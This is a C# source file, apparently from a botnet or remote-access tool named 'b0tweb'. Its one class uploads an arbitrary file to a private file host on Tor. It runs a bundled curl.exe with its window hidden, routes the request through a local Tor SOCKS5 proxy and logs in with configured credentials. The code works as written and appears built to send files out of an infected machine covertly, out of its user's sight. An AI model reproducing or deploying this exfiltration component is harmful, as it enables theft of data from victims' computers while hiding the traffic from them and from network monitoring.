using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Threading;
using System.IO;
using Newtonsoft.Json;
using System.Diagnostics;

namespace b0tweb
{
    /// <summary>
    /// Upload a file to a private Pomf Clone.
    /// </summary>
    class HTTPUpload
    {
        /// <summary>
        /// Upload a file to the hosted pomf clone on Tor.
        /// </summary>
        /// <param name="filePath">Path to the file to upload.</param>
        /// <returns>Empty string if something went wrong, else an URL pointing to a file.</returns>
        public static string Upload(string filePath)
        {
            string basePath = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location);
            string argument = String.Format(
                 "--socks5-hostname {0}  -F \"files[]=@{1}\" {2}  --user {3}:{4}",
                "localhost:9050", //TODO: Move this to tor proxy
                filePath,
                Configuration.HTTPServer,
                Configuration.HTTPUsername,
                Configuration.HTTPPassword
            );

            ProcessStartInfo info = new ProcessStartInfo(basePath + @"\Curl\curl.exe", argument)
            {
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };

            Process process = new Process()
            {
                StartInfo = info
            };

            process.Start();

            dynamic json = JsonConvert.DeserializeObject(process.StandardOutput.ReadToEnd());

            if (json.success == true)
            {
                return json.files[0].url;
            }

            return String.Empty;
        }
    }
}
